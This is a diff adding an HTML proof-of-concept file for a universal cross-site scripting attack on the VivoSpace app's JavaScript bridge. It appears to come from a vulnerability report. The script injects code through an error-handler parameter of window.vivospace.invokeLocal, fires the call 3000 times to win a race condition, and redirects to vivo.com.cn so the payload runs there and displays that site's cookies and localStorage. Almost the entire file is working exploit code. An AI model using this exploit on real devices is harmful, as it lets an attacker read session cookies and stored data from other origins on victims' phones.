@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UXSS PoC - VivoSpace JSBridge Race Condition</title>
+</head>
+<body>
+<h3>VivoSpace UXSS PoC</h3>
+<p id="status">Exploiting...</p>
+
+<script>
+var payload = 'setTimeout(function(){' +
+    'document.write("<h1>UXSS SUCCESS</h1>"' +
+    '+"<b>URL:</b> "+location.href+"<br><br>"' +
+    '+"<b>Cookie:</b> "+document.cookie+"<br><br>"' +
+    '+"<b>localStorage:</b> "+JSON.stringify(localStorage)+"<br><br>"' +
+    '+"<b>Origin:</b> "+location.origin);' +
+'}, 1500)';
+
+var invokeParam = JSON.stringify({
+    "localErrorCatch": false,
+    "webErrorCatch": payload + "//"
+});
+
+for (var i = 0; i < 3000; i++) {
+    (function(idx) {
+        setTimeout(function() {
+            try {
+                window.vivospace.invokeLocal("nonExistMethod", invokeParam);
+            } catch(e) {}
+        }, 100 + idx * 2);
+    })(i);
+}
+
+setTimeout(function() {
+    location.href = "https://www.vivo.com.cn";
+}, 150);
+</script>
+</body>
+</html>
